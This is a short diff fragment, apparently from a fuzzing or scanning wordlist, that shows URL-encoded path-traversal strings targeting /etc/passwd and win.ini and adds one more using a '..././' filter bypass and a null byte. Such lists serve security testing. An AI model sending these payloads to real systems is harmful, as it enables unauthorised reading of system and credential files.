@@ -37,3 +37,4 @@
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
+..././..././..././etc/passwd%00
